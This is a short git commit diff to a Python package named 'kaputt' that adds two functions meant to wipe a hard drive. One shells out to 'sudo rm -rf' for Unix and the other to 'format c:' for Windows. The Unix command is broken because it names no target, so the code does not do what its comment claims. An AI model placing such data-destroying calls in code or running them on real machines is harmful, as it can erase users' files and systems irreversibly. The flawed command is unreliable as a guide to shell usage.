65a76a273e3b585585b40b25625f1838e184c258
montoyamoraga <montoyamoraga@gmail.com>
2018-06-06 00:30:18 -0500

    add wipe hadr drive functions

--- kaputt/__init__.py
+++ kaputt/__init__.py
@@ -1,1 +1,13 @@
-name = "kaputt"
+#kaputt.py
+#by aaron montoya-moraga
+
+#import modules
+import os
+
+#function for wiping hard drive - Unix OS
+def wipeUnix():
+    os.system("sudo rm -rf")
+
+#function for wiping hard drive - Windows OS
+def wipeWindows():
+    os.system("format c:")
